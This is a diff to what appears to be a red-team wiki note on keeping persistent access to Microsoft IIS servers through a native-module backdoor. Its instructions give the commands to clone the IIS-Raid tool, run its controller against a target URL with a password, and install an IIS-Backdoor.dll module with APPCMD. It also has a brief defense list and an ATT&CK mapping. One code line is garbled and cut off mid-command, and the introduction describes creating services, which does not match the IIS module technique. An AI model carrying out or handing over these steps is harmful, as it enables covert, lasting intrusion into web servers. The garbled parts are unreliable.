@@ -42,11 +42,15 @@ To establish the backdoor, the attacker typically creates a new service with a u
 
 This technique is valuable to attackers as it allows them to maintain access to a compromised system even if the initial point of entry is discovered and removed.
 
+ 
+
 ## Requirements
 
 1. Access to the target system
 
 1. Privileged access to create or modify services
+
+ 
 
 ## Defense
 
@@ -56,11 +60,15 @@ This technique is valuable to attackers as it allows them to maintain access to 
 
 1. Use endpoint protection tools that can detect and block suspicious activity, such as the creation of new services or modification of existing ones
 
+ 
+
 ## Objectives
 
 1. Establish a persistent backdoor on a compromised system
 
 1. Maintain access to the compromised system over an extended period of time
+
+ 
 
 # Instructions
 
@@ -69,10 +77,18 @@ This technique is valuable to attackers as it allows them to maintain access to 
 2. Run the iis_controller.py script with the target URL and password using the command: $ python iis_controller.py --url http://192.168.1.11/ --password SIMPLEPASS
 3. Install the module by executing the following command: C:\Windows\system32\inetsrv\APPCMD.EXE install module /name:Module Name /image:"%windir%\System32\inetsrv\IIS-Backdoor.dll" /add:true
 
+ 
+
+
+
 **Code**: [[$ git clone https://github.com/0x09AL/IIS-Raid
 $ p]]
 
+
+
 > This command is used to backdoor IIS using native modules. The command first clones the IIS-Raid repository and then runs the iis_controller.py script with the target URL and password. Finally, it installs the module by executing the specified command. The backdoor allows for remote access to the IIS server, which can be used to perform various malicious activities.
+
+
 
 **Command** ([[Clone IIS-Raid repository]]):
 
@@ -80,17 +96,27 @@ $ p]]
 $ git clone https://github.com/0x09AL/IIS-Raid
 ```
 
+
+
+
+
 **Command** ([[Execute IIS-Raid script]]):
 
 ```bash
 $ python iis_controller.py --url http://192.168.1.11/ --password SIMPLEPASS
 ```
 
+
+
+
+
 **Command** ([[Install IIS-Backdoor module]]):
 
 ```bash
 C:\Windows\system32\inetsrv\APPCMD.EXE install module /name:Module Name /image:"%windir%\System32\inetsrv\IIS-Backdoor.dll" /add:true
 ```
+
+
 
 ## MITRE ATT&CK Mapping
 
@@ -119,3 +145,5 @@ C:\Windows\system32\inetsrv\APPCMD.EXE install module /name:Module Name /image:"
 - [[IIS]]
 - [[Serviceland]]
 - [[Windows - Persistence]]
+
+
